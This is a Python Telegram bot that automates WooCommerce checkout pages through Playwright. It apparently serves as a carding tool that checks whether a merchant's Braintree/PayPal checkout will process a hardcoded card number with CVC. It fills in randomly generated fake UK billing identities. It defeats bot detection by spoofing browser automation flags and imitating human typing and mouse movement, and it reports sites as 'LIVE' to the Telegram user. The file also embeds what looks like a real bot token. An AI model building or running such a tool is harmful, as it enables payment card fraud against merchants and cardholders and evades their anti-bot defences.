#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Braintree Bot — Playwright Human Mode
- Test on /paypal URL
- Human typing + mouse
- Screenshot to Owner on error
"""
import telebot
import time, os, re, json, random, threading, logging
from urllib.parse import urlparse
from collections import defaultdict

from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout, Error as PWError

# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════════════════
BOT_TOKEN = '8407490230:AAEhaQd1CAsCH8qRaaFCQ65o9RVAf8EdTiA'
OWNER_ID  = 6843321125

SCREENSHOT_DIR = 'screens'

CARD_NUMBER = '5523427233579293'
CARD_MM     = '12'
CARD_YY     = '2027'
CARD_CVC    = '953'

HEADLESS     = False   # ← لو على سيرفر بدون شاشة، غيّرها لـ True
TYPE_DELAY   = 80      # ms per char
PAGE_TIMEOUT = 60000
NAV_TIMEOUT  = 90000

os.makedirs(SCREENSHOT_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('bot.log', encoding='utf-8'), logging.StreamHandler()],
)
log = logging.getLogger('bt')

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# ═══════════════════════════════════════════════════════════════════════════════
#  HUMAN DATA
# ═══════════════════════════════════════════════════════════════════════════════
FIRST = ['James','John','Robert','Michael','William','David','Richard','Joseph',
         'Thomas','Charles','Daniel','Matthew','Anthony','Mark','Donald','Steven',
         'Paul','Andrew','Joshua','Kenneth','Kevin','Brian','George','Timothy',
         'Ronald','Edward','Jason','Jeffrey','Ryan','Jacob','Gary','Nicholas']

LAST = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis',
        'Rodriguez','Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson',
        'Thomas','Taylor','Moore','Jackson','Martin','Lee','Perez','Thompson',
        'White','Harris','Sanchez','Clark','Ramirez','Lewis','Robinson','Walker']

STREETS = ['High','Church','Park','Victoria','Green','Manor','Kings','Queens',
           'Station','Mill','School','New','Mount','Forest','Garden','Spring',
           'Chapel','Bridge','Market','Albert','Windsor','York','Regent','Oxford']

ST_TYPES = ['Street','Road','Lane','Avenue','Close','Drive','Way','Place']

CITIES_UK = [
    ('London',    'EC1A 1BB'),
    ('Manchester','M1 1AE'),
    ('Birmingham','B1 1AA'),
    ('Leeds',     'LS1 1UR'),
    ('Liverpool', 'L1 0AA'),
    ('Bristol',   'BS1 1AA'),
    ('Sheffield', 'S1 1AA'),
    ('Newcastle', 'NE1 1AA'),
    ('Nottingham','NG1 1AA'),
    ('Leicester', 'LE1 1AA'),
]

def rnd_name():
    return random.choice(FIRST), random.choice(LAST)

def rnd_email(f, l):
    n = random.randint(1, 9999)
    return random.choice([
        f'{f.lower()}{n}@gmail.com',
        f'{f.lower()}.{l.lower()}{n}@gmail.com',
        f'{f.lower()}{l.lower()}{n}@googlemail.com',
        f'{f[0].lower()}{l.lower()}{n}@outlook.com',
    ])

def rnd_address():
    n = random.randint(1, 250)
    s = random.choice(STREETS)
    t = random.choice(ST_TYPES)
    c, pc = random.choice(CITIES_UK)
    return f'{n} {s} {t}', c, pc

def rnd_phone():
    return '07' + ''.join(str(random.randint(0,9)) for _ in range(9))

# ═══════════════════════════════════════════════════════════════════════════════
#  URL VALIDATION
# ═══════════════════════════════════════════════════════════════════════════════
_URL_RE = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$')

def safe_url(link):
    try:
        if not link or not isinstance(link, str): return None
        link = link.strip()
        if not link.startswith(('http://','https://')): link = 'https://' + link
        p = urlparse(link)
        if not p.netloc: return None
        host = p.netloc.split(':')[0]
        if not _URL_RE.match(host): return None
        return link
    except: return None

# ═══════════════════════════════════════════════════════════════════════════════
#  HUMAN HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
def pause(a=0.4, b=1.2):
    time.sleep(random.uniform(a, b))

def type_human(page, selector, text):
    try:
        page.fill(selector, '', timeout=5000)
        page.click(selector, timeout=5000)
        pause(0.2, 0.5)
        page.type(selector, text, delay=TYPE_DELAY, timeout=10000)
        pause(0.3, 0.7)
        return True
    except: return False

def mouse_play(page):
    try:
        vp = page.viewport_size or {'width':1366,'height':768}
        for _ in range(random.randint(2,4)):
            page.mouse.move(
                random.randint(100, vp['width']-100),
                random.randint(100, vp['height']-100),
                steps=random.randint(8,20),
            )
            pause(0.2, 0.6)
        page.mouse.wheel(0, random.randint(100, 300))
        pause(0.3, 0.8)
    except: pass

def scroll_page(page):
    try:
        for _ in range(random.randint(1,3)):
            page.mouse.wheel(0, random.randint(150, 400))
            pause(0.3, 0.7)
    except: pass

def screenshot(page, tag='err'):
    try:
        t = re.sub(r'[^a-zA-Z0-9]','_', tag)[:20]
        fn = f'{t}_{int(time.time())}_{random.randint(100,999)}.png'
        fp = os.path.join(SCREENSHOT_DIR, fn)
        page.screenshot(path=fp, full_page=True, timeout=15000)
        return fp
    except Exception as e:
        log.error(f'screenshot: {e}')
        return None

def send_shot_to_owner(url, error, shot_path, response=''):
    try:
        cap = (
            f'🚨 <b>ERROR</b>\n'
            f'━━━━━━━━━━━━━━━━\n'
            f'🔗 <code>{url[:200]}</code>\n'
            f'❌ <code>{error[:400]}</code>\n'
        )
        if response: cap += f'📝 <code>{response[:250]}</code>\n'
        cap += f'🕐 <code>{time.strftime("%H:%M:%S")}</code>'

        if shot_path and os.path.exists(shot_path):
            try:
                with open(shot_path,'rb') as f:
                    bot.send_photo(OWNER_ID, f, caption=cap, parse_mode='HTML', timeout=120)
                try: os.remove(shot_path)
                except: pass
                return True
            except:
                try:
                    with open(shot_path,'rb') as f:
                        bot.send_document(OWNER_ID, f, caption=re.sub(r'<[^>]+>','',cap)[:1024], timeout=120)
                    try: os.remove(shot_path)
                    except: pass
                    return True
                except Exception as e:
                    log.error(f'send shot: {e}')
        else:
            try: bot.send_message(OWNER_ID, cap, parse_mode='HTML')
            except: pass
    except Exception as e:
        log.error(f'send_shot: {e}')

# ═══════════════════════════════════════════════════════════════════════════════
#  PLAYWRIGHT FLOW
# ═══════════════════════════════════════════════════════════════════════════════
def do_flow(page, url):
    """Fill form, submit, read response. Returns dict."""
    res = {'status':'unknown','response':'','error':'','screenshot':None}

    # Random human data
    f, l = rnd_name()
    email = rnd_email(f, l)
    addr, city, pc = rnd_address()
    phone = rnd_phone()

    try:
        # ═══ Navigate ═══
        log.info(f'navigate: {url}')
        try:
            page.goto(url, wait_until='domcontentloaded', timeout=NAV_TIMEOUT)
        except PWTimeout:
            log.warning('nav timeout, continue')

        pause(2.0, 4.0)
        mouse_play(page)
        scroll_page(page)

        # ═══ Fill form ═══
        log.info(f'fill: {f} {l} | {email}')

        for sel in ['#billing_first_name','input[name="billing_first_name"]']:
            if type_human(page, sel, f): break
        pause(0.3, 0.8)

        for sel in ['#billing_last_name','input[name="billing_last_name"]']:
            if type_human(page, sel, l): break
        pause(0.3, 0.8)

        for sel in ['#billing_country','select[name="billing_country"]']:
            try: page.select_option(sel, 'GB', timeout=3000); break
            except: pass
        pause(0.3, 0.8)

        for sel in ['#billing_address_1','input[name="billing_address_1"]']:
            if type_human(page, sel, addr): break
        pause(0.3, 0.8)

        for sel in ['#billing_city','input[name="billing_city"]']:
            if type_human(page, sel, city): break
        pause(0.3, 0.8)

        for sel in ['#billing_postcode','input[name="billing_postcode"]']:
            if type_human(page, sel, pc): break
        pause(0.3, 0.8)

        for sel in ['#billing_phone','input[name="billing_phone"]']:
            if type_human(page, sel, phone): break
        pause(0.3, 0.8)

        for sel in ['#billing_email','input[name="billing_email"]']:
            if type_human(page, sel, email): break
        pause(0.5, 1.2)

        # ═══ Card fields (iframes) ═══
        log.info('fill card iframes')
        card_filled = False
        for frame in page.frames:
            furl = (frame.url or '').lower()
            if 'braintree' in furl or 'hosted-fields' in furl or 'paypal' in furl:
                try:
                    for sel in ['input[name="number"]','input[name*="card-number"]','#credit-card-number']:
                        try: frame.fill(sel, CARD_NUMBER, timeout=2000); card_filled=True; break
                        except: continue
                    for sel in ['input[name="expirationDate"]','input[name*="expiration"]','input[name*="expiry"]']:
                        try: frame.fill(sel, f'{CARD_MM}/{CARD_YY}', timeout=2000); break
                        except: continue
                    for sel in ['input[name="cvv"]','input[name*="cvc"]','input[name*="security-code"]']:
                        try: frame.fill(sel, CARD_CVC, timeout=2000); break
                        except: continue
                except: continue

        if not card_filled:
            for sel, val in [
                ('#card_number', CARD_NUMBER),
                ('#card_expiry', f'{CARD_MM}/{CARD_YY}'),
                ('#card_cvc', CARD_CVC),
            ]:
                try: page.fill(sel, val, timeout=1500)
                except: pass

        pause(0.5, 1.0)
        mouse_play(page)

        # ═══ Terms ═══
        for sel in ['#terms','input[name="terms"]','input[name="gdpr_woo_consent"]']:
            try:
                if not page.is_checked(sel, timeout=1000): page.check(sel, timeout=2000)
                break
            except: continue
        pause(0.5, 1.0)

        # ═══ Submit ═══
        log.info('submit')
        clicked = False
        for sel in ['#place_order','button[name="woocommerce_checkout_place_order"]',
                    'input[name="woocommerce_checkout_place_order"]',
                    'button[type="submit"]']:
            try: page.click(sel, timeout=4000); clicked=True; break
            except: continue

        if not clicked:
            res['error'] = 'NO_SUBMIT_BUTTON'
            res['screenshot'] = screenshot(page, 'no_submit')
            return res

        page.wait_for_timeout(12000)

        # ═══ Read response ═══
        log.info('read response')
        try:
            r = page.evaluate("""() => {
                const err = document.querySelector('.woocommerce-error, .wc-block-components-notice-banner.is-error');
                const suc = document.querySelector('.woocommerce-message, .wc-block-components-notice-banner.is-success');
                if (err) return 'ERROR: ' + err.textContent.trim().substring(0,400);
                if (suc) return 'SUCCESS: ' + suc.textContent.trim().substring(0,400);
                if (window.location.href.includes('order-received')) return 'ORDER_RECEIVED';
                return 'UNKNOWN';
            }""")
            res['response'] = r
            low = r.lower()
            if 'order_received' in low or 'success' in low or 'thank you' in low:
                res['status'] = 'live'
            elif '3d secure' in low or '3ds' in low:
                res['status'] = 'live'
                res['response'] = '3DS_CHALLENGE: ' + r[:200]
            elif any(k in low for k in ['declined','rejected','insufficient','cvv','expired','verify','human']):
                res['status'] = 'live'
            else:
                res['status'] = 'unknown'
                res['screenshot'] = screenshot(page, 'unknown')
        except Exception as e:
            res['error'] = f'READ: {e}'
            res['screenshot'] = screenshot(page, 'read_err')

    except PWTimeout as e:
        res['error'] = f'TIMEOUT: {str(e)[:150]}'
        res['screenshot'] = screenshot(page, 'timeout')
    except PWError as e:
        res['error'] = f'PW_ERROR: {str(e)[:150]}'
        res['screenshot'] = screenshot(page, 'pw_err')
    except Exception as e:
        res['error'] = f'EXCEPTION: {str(e)[:150]}'
        res['screenshot'] = screenshot(page, 'exc')

    return res

def run_session(url):
    final = {'status':'unknown','response':'','error':'','screenshot':None}
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=HEADLESS,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--no-sandbox','--disable-dev-shm-usage',
                    '--disable-setuid-sandbox','--disable-web-security',
                ]
            )
            ctx = browser.new_context(
                viewport={'width':1366,'height':768},
                user_agent=('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                            'AppleWebKit/537.36 (KHTML, like Gecko) '
                            'Chrome/120.0.0.0 Safari/537.36'),
                locale='en-GB',
                timezone_id='Europe/London',
                ignore_https_errors=True,
            )
            ctx.add_init_script("""
                Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
                Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
                Object.defineProperty(navigator,'languages',{get:()=>['en-GB','en']});
                window.chrome={runtime:{}};
            """)
            page = ctx.new_page()
            page.set_default_timeout(PAGE_TIMEOUT)
            page.set_default_navigation_timeout(NAV_TIMEOUT)

            result = do_flow(page, url)
            final.update(result)

            try: ctx.close()
            except: pass
            try: browser.close()
            except: pass
    except Exception as e:
        final['error'] = f'LAUNCH: {str(e)[:150]}'
    return final

# ═══════════════════════════════════════════════════════════════════════════════
#  BOT HANDLER — Direct test on /paypal <url>
# ═══════════════════════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def handle_paypal(msg):
    try:
        parts = msg.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(msg, 'Usage: /paypal <url>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            bot.reply_to(msg, 'Invalid URL')
            return

        status_msg = bot.reply_to(msg, f'Testing: {link[:80]}\nPlease wait...')

        def worker():
            try:
                result = run_session(link)
                status = result.get('status','unknown')
                response = (result.get('response') or '')[:300]
                error = (result.get('error') or '')[:300]
                shot = result.get('screenshot')

                # Send error screenshot to owner
                if error or shot:
                    send_shot_to_owner(link, error or 'screenshot', shot, response)

                # Send result to user
                if status == 'live':
                    final = (
                        f'✅ LIVE\n'
                        f'URL: {link[:80]}\n'
                        f'Response: {response[:200]}'
                    )
                else:
                    reason = error or response or 'UNKNOWN'
                    final = (
                        f'❌ DEAD\n'
                        f'URL: {link[:80]}\n'
                        f'Response: {reason[:200]}'
                    )
                try:
                    bot.edit_message_text(
                        chat_id=msg.chat.id,
                        message_id=status_msg.message_id,
                        text=final,
                        disable_web_page_preview=True,
                    )
                except: pass
            except Exception as e:
                log.exception('worker')
                send_shot_to_owner(link, f'WORKER: {e}', None)
                try:
                    bot.edit_message_text(
                        chat_id=msg.chat.id,
                        message_id=status_msg.message_id,
                        text=f'Error: {str(e)[:200]}'
                    )
                except: pass

        threading.Thread(target=worker, daemon=True).start()

    except Exception:
        log.exception('paypal')

# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    log.info('Bot starting...')
    log.info(f'Card: ****{CARD_NUMBER[-4:]}')
    log.info(f'Owner: {OWNER_ID} (gets screenshots on error)')
    log.info(f'Headless: {HEADLESS}')

    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                 skip_pending=True, logger_level=logging.WARNING)
        except KeyboardInterrupt:
            break
        except Exception as e:
            err = str(e).lower()
            log.error(f'polling: {str(e)[:200]}')
            if '409' in err or 'conflict' in err:
                log.error('409 — another instance running')
                time.sleep(60)
            else:
                time.sleep(15)
